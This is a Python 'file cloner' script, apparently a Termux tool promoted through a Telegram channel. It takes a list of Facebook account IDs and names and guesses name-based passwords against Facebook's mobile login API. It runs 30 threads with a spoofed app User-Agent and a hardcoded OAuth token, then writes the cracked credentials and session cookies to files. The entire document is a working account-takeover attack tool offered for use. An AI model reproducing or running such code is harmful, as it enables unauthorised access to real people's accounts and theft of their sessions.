import random
import os
import sys
import uuid
import json
import requests
from concurrent.futures import ThreadPoolExecutor

class File_Clone:
    def __init__(self):
        self.loop = 0
        self.oks = []
        self.cps = []
        self.plist = []
    def banner(self):
        os.system("clear")
        print(f"""
[•] TOOL :- FILE CLONER
[•] VERSION :- 1.0
[•]JONE :- https://t.me/KGF_TERMUX_TEAM
--------------------------""")
    def linex(self):
        print("--------------------------")
    def gift(self) -> None:
        self.banner()
        print("[1] START FILE CLONE")
        print("[2] EXIT TOOL")
        print ("Jone :- https://t.me/KGF_TERMUX_TEAM")
        self.linex()
        mr_code = input("[•] SELECT : ")
        if mr_code == "1":self.fileclone()
        elif mr_code == "2":sys.exit(self.linex())
        else:self.gift()
    def fileclone(self) -> None:
        self.banner()
        file = input("[•] FILE PATH : ");self.linex()
        try:files = open(file,"r").read().splitlines()
        except FileNotFoundError:self.fileclone()
        print("[1] AUTO PASSWORD CLONE")
        print("[2] MANUAL PASSWORD CLONE")
        self.linex()
        pss = input("[•] SELECT : ")
        if pss == "1":self.plist = ['first12','first123','first1234','first12345','first@123','first@1234','first@12345','last123','last1234','last12345','fullname','Fullname']
        else:
            self.linex()
            print("[•] EXAMPLE  : first123,last123,etc")
            while True:
                xnxxx = input("[•] PASS :- ")
                if len(xnxxx) == 0:break
                else:self.plist.append(xnxxx)
        with ThreadPoolExecutor(max_workers=30) as Mr_Code:
            self.banner()
            print("[•] TOTAL IDS :- ",str(len(files)))
            print("[•] AKHN BOSE THAKO BONDHUGON")
            self.linex()
            for sex in files:
                ids,names = sex.split("|")
                passlist = self.plist
                Mr_Code.submit(self.methodA,ids,names,passlist)
        print("\n")
        self.linex()

    def methodA(self,ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f"\r\r[FILE-XD] {self.loop}|•|{len(self.oks)}|{len(self.cps)}")
        sys.stdout.flush()
        try:
            first = names.split(" ")[0]
            try:last = names.split(" ")[1]
            except:last = first
            for pw in passlist:
                pas = pw.replace("first",first.lower()).replace("last",last.lower()).replace("First",first).replace("Last",last).replace("fullname",names.lower()).replace("Fullname",names)
                data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': ids,
                'password': pas,
                'generate_analytics_claims': '1',
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'meta_inf_fbmeta': '',
                'currently_logged_in_userid': '0',
                'fb_api_req_friendly_name': 'authenticate'}
                head = {'User-Agent':'[FBAN/FB4A;FBAV/295.0.0.36.119;FBBV/254634744;FBDM/{density=2.0,width=720,height=1424};FBLC/en_US;FBRV/256299347;FBCR/IND airtel;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1803;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
               'Accept-Encoding': 'gzip, deflate', 
                'Accept': '*/*', 
                'Connection': 'keep-alive', 
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                'X-FB-Friendly-Name': 'authenticate', 
                'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                'X-FB-Connection-Type': 'unknown', 
                'Content-Type': 'application/x-www-form-urlencoded', 
                'X-FB-HTTP-Engine': 'Liger'}
                url = "https://graph.facebook.com/auth/login"
                response = requests.post(url,data=data,headers=head).json()
                if "access_token" in response:
                    coki = ";".join(i["name"]+"="+i["value"] for i in response["session_cookies"])
                    print(f"\r\r\x1b[92m[OK] • {ids} • {pas}\x1b[m")
                    with open("/sdcard/gift-ok.txt","a") as save:
                        save.write(ids+"|"+pas+"|"+coki+"\n")
                    self.oks.append(ids)
                    break
                elif "www.facebook.com" in response["error"]["message"]:
                    print(f"\r\r\x1b[91m[CP] • {ids} • {pas}\x1b[m")
                    with open("/sdcard/gift-cp.txt","a") as save:
                        save.write(ids+"|"+pas+"\n")
                    self.cps.append(ids)
                    break
                else:continue
            self.loop+=1
        except Exception as e:
            print(e)


File_Clone().gift()
